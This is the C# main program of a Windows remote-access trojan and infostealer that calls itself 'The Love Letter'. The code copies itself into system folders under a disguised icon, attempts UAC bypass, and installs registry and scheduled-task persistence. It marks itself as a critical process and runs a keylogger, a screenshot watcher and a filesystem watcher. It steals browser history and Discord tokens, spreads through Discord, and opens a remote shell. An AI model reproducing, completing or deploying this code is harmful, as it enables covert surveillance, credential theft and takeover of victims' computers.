using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client
{
    class Program
    {
        internal static int UACMethod = 0;
        /// <summary>
        /// Main entry point.
        /// </summary>
        static void Main(string[] args)
        {
            // make sure this thing wont crash
            Application.ThreadException += Application_ThreadException;

            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;

            Console.WriteLine("The Love Letter.");

            ArgsParser(args);

            CheckRealApplication();

            CheckSettings();

#if !DEBUG
            /// Check if Application is already on victim PC
            if (!Constants.IsInAppData() && !Constants.IsInWinDir())
                // its not on any infectable folder, put the letter on appdata
                Migrate();

            /// Attempt to be God
            if (!Constants.IsAdmin())
            {
                if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
                    Armitage.UAC.UAC_Bypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
                // else...do nothing ;(

                // add startup to registry...for the meantime
                Armitage.Startup.ViaRegistry();
            }
            else // it is admin!
            {
                Console.WriteLine("Admin!");
                if (!Constants.IsInWinDir())
                {
                    if (GoSomewhereSafe() != null)
                    {
                        Environment.Exit(0);
                    }
                }
                // now it will run there, wait for it to hook there
                if (Constants.IsInWinDir())
                {
                    // check if the system32 path task already exists
                    // if not just go along.

                    // always creates the taskscheduler task, replace if exists
                    Armitage.Startup.ViaTaskScheduler(Constants.WinDirTaskName);

                    // needs to be a separate if to get called after creating the task
                    if (Armitage.Startup.IsTaskExists(Constants.WinDirTaskName))
                    {
                        // if the task has been successfully added check if the old
                        // registry startup still exists
                        if (Armitage.Startup.IsOldStartupExist())
                            // if it does, remove it
                            Armitage.Startup.RemoveOldRegistryStartupKey();
                    }
                    // everything is set
                    // set the letter to be critical, unburnable
                    ProtectTheLetter();
                    // send to events we had a successful run

                }
            }


            /// Start loggers.
            Armitage.Watchers.Keylogger.Start();

            Armitage.Watchers.Screen_Watcher.SendOne(); // send a screenshot 

            Armitage.Watchers.Screen_Watcher.Start();

            Armitage.Watchers.Filesystem.Start();

            // send this once everyday
            if ((Constants.Today - Properties.Settings.Default.LastHistorySent).TotalDays > 1)
            {
                Armitage.Cookies.History_Stealer.SendOne(); // send history
            }

            /// Start looting.
            // Discord tokens
            var discord_tokens = Armitage.Cookies.Discord_Token.Stealu();

            Armitage.Cookies.Discord_Token.Send(discord_tokens);

#if !DiscordSpreadDisabled
            // run every 5 days or so
            if (discord_tokens.Count > 0 && (Constants.Today - Properties.Settings.Default.LastDiscordSent).TotalDays > 5)
            {
                Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.Select(x => x.Item2).ToArray());
             
                spreader.Start();S
            }
            else { Console.WriteLine("found tokens : " + discord_tokens.Count.ToString()); }

#endif
            /// Send machine info
            Armitage.Informer.Start();
#endif

            /// Init update checkers.
            Utilities.Updater Updater = new Utilities.Updater();
            Updater.Start();

            /// Start remote shell
            Armitage.Shell.Shell.Start();

            Properties.Settings.Default.IsFirstRun = false;

            Properties.Settings.Default.Save();

            Console.WriteLine("All Done");

            while (true)
            {
                // Sleep, useless, but...makes me feel confident
                // the letter wont randomly close...
                Thread.Sleep(100 * 1000);
            }
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
        }

        private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
        }

        public static void ArgsParser(string[] args)
        {
            try
            {
                if (args.Length > 0)
                {
                    // PID of parent to kill
                    int parent = int.Parse(args[0].Trim());
                    if (parent > 0)
                        Process.GetProcessById(parent).Kill();

                    // this wont get called if the argument is only PID
                    if (args.Length > 1)
                    {
                        /// Find suitable UAC method.
                        /// Since the last method didn't work,
                        /// increment the active method.
                        UACMethod = int.Parse(args[1].Trim()) + 1;
                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// Turn into a system process.
        /// </summary>
        public static void ProtectTheLetter()
        {
            Armitage.Critical_Process.Protect();
        }

        public static string GoSomewhereSafe()
        {
            try
            {
                string randomsysapp = Utilities.Files_And_Pathing.GetRandomSystem32Executable();

                string fullrandomsysapp = Path.GetFullPath(Environment.SystemDirectory + "/" + randomsysapp);

                string windirpath = Path.GetFullPath(Constants.WinDir + "/" + randomsysapp);

                Armitage.Copy.CopySelfTo(windirpath);
                // change the letter's stamp
                var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(fullrandomsysapp);

                Utilities.Icon_Util.ChangeIcon(windirpath, randicon);
                // run from there
                Process.Start(windirpath);

                return windirpath;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            return null;
        }
        public static void Migrate()
        {
            if (Armitage.Copy.CopySelfTo(Constants.MMCFile))
            {
                // change mmc copy icon
                Utilities.Icon_Util.ChangeIcon(Constants.MMCFile, Properties.Resources.system);

                if (Process.Start(Constants.MMCFile, Constants.MyProcessID.ToString()).Id > 0)
                {
                    Environment.Exit(0);
                }
            }
        }
        /// <summary>
        /// Checks if a batch file named ll_ exists, if it does, runs it as an executable. The '.exe' extension is not needed.
        /// </summary>
        public static void CheckRealApplication()
        {
            string target = AppDomain.CurrentDomain.BaseDirectory + "/ll_";
            if (File.Exists(target))
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = target,
                        UseShellExecute = false
                    }
                };

                try
                {
                    p.Start();
                }
                catch { }
            }
        }
        public static void CheckSettings()
        {
            Console.WriteLine("Is Discord Sent : " + Properties.Settings.Default.IsDiscordSent.ToString());

            Console.WriteLine("Is First Run : " + Properties.Settings.Default.IsFirstRun.ToString());
        }
        public static void EvadeVM()
        {
            Task.Run(() =>
            {
                Armitage.Evade.Epilepsy_Generator e = new Armitage.Evade.Epilepsy_Generator();

                e.ShowDialog();
            });
        }
    }
}
